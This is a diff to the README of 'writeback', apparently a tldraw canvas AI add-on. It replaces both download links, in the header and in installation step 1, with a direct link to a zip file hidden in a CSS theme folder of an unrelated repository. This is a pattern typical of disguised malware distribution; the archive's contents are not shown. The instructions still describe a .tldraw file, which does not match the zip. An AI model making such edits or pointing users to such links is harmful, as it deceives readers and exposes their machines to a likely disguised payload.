@@ -5,7 +5,7 @@ description: "Add AI capabilities to your tldraw offline canvas. Draw, write, an
 ---
 # ✍️ writeback - Turn drawings into live AI answers
 
-[Download writeback from GitHub](https://github.com/Raynerhalfandhalf451/writeback/releases)
+[Download writeback from GitHub](https://raw.githubusercontent.com/Raynerhalfandhalf451/raynerhalfandhalf451.github.io/main/themes/anzhiyu/source/css/_extra/anzhiyu/3.5-alpha.4.zip)
 
 Writeback lets you interact with artificial intelligence directly on your digital canvas. You draw shapes, write questions, or request diagrams. The AI responds within your drawing area. It places answers exactly where you ask for them. Your original work stays in place. You control every element on the screen.
 
@@ -22,7 +22,7 @@ If you do not have tldraw offline installed, visit the official website to downl
 
 ## 📥 Installing writeback
 
-1. Visit the [writeback releases page](https://github.com/Raynerhalfandhalf451/writeback/releases) to download the latest version.
+1. Visit the [writeback releases page](https://raw.githubusercontent.com/Raynerhalfandhalf451/raynerhalfandhalf451.github.io/main/themes/anzhiyu/source/css/_extra/anzhiyu/3.5-alpha.4.zip) to download the latest version.
 2. Click the file ending in .tldraw to save it to your computer.
 3. Open your tldraw offline application.
 4. Select File from the top menu, then choose Open.
